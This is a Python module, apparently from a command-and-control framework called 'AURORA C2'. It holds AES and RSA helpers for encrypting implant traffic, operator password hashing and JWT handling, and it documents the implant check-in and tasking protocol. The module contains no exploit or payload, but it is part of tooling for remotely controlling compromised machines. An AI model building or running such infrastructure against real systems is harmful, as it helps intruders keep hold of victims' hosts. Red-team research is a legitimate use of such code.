"""
AURORA C2 - Cryptographic Utilities

AES-256-CBC encryption for implant comms.
PKCS7 padding, random 16-byte IV prepended to ciphertext, base64-encoded.

Protocol (plaintext before encryption, pipe-delimited):
  Register:  REGISTER|hostname|username|os|arch|ip|pid|beacon_id
  GetTask:   (beacon_id in URL, empty body)
  Result:    RESULT|task_id|status|output_b64
  Task push: TASK|task_id|command|arg1|arg2|...
             NOTASK  (when queue is empty)
"""
from __future__ import annotations

import base64
import os
import time
from datetime import datetime, timedelta, timezone

import bcrypt
import jwt
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad


# ── AES-256-CBC session key helpers ─────────────────────

def encrypt_key(plaintext: str, key: bytes) -> str:
    """Encrypt plaintext with a raw 32-byte AES key."""
    if len(key) != 32:
        raise ValueError("AES session key must be 32 bytes")
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return base64.b64encode(iv + ct).decode()


def decrypt_key(b64_data: str, key: bytes) -> str:
    """Decrypt base64(IV||ciphertext) with a raw 32-byte AES key."""
    if len(key) != 32:
        raise ValueError("AES session key must be 32 bytes")
    raw = base64.b64decode(b64_data)
    iv, ct = raw[:16], raw[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size).decode()


def rsa_decrypt_b64(b64_data: str) -> str:
    """Decrypt a base64 RSA/PKCS#1 v1.5 packet.

    The RSA private key is loaded from encrypted resources (resources/rsa_private_key.enc),
    decrypted in memory, and cached. It is never stored in plaintext on disk.
    """
    from resource_manager import load_rsa_private_key_pem
    key = RSA.import_key(load_rsa_private_key_pem())
    cipher = PKCS1_v1_5.new(key)
    normalized = b64_data.replace("-", "+").replace("_", "/")
    normalized += "=" * (-len(normalized) % 4)
    raw = base64.b64decode(normalized)
    sentinel = os.urandom(32)

    # CryptoAPI returns RSA ciphertext in little-endian byte order. Try both
    # orders, and keep going if PyCryptodome rejects one as larger than n.
    for candidate in (raw, raw[::-1]):
        try:
            pt = cipher.decrypt(candidate, sentinel)
        except ValueError:
            continue
        if pt != sentinel:
            return pt.decode()

    raise ValueError("RSA decrypt failed")


# ── Operator auth ───────────────────────────────────────

def hash_password(password: str) -> str:
    """bcrypt-hash a password."""
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()


def verify_password(password: str, hashed: str) -> bool:
    """Verify *password* against a bcrypt *hashed* string."""
    try:
        return bcrypt.checkpw(password.encode(), hashed.encode())
    except Exception:
        return False


# ── JWT ─────────────────────────────────────────────────

def create_token(username: str, secret: str, algo: str, exp_hours: int) -> str:
    """Issue a JWT for *username*."""
    payload = {
        "sub": username,
        "iat": datetime.now(timezone.utc),
        "exp": datetime.now(timezone.utc) + timedelta(hours=exp_hours),
    }
    return jwt.encode(payload, secret, algorithm=algo)


def verify_token(token: str, secret: str, algo: str) -> str | None:
    """Verify a JWT, return *username* or None."""
    try:
        payload = jwt.decode(token, secret, algorithms=[algo])
        return payload.get("sub")
    except Exception:
        return None


# ── Helpers ─────────────────────────────────────────────

def b64encode(data: bytes) -> str:
    return base64.b64encode(data).decode()


def b64decode(data: str) -> bytes:
    return base64.b64decode(data)


def now_ts() -> float:
    return time.time()
